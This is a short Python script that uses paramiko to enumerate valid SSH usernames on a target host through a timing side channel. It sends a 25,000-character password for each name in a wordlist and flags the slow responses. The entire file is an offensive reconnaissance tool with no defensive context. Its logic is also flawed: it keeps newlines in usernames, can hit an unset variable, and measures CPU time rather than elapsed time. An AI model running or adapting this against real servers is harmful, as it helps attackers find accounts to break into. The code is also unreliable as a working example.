import paramiko
import time
import sys

if len(sys.argv) != 2:
        print("Use: ssh.py ip")

filelogins=open('listadologins.txt')

logins=filelogins.readlines()

for login in logins:
        p='A'*25000
        ip=str(sys.argv[1])

        ssh = paramiko.SSHClient()
        starttime=time.process_time()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        try:
                ssh.connect(ip, username=login, password=p)
        except:
                endtime=time.process_time()

        total=endtime-starttime
        if total > 0.03:
                print(login)

        time.sleep(5)
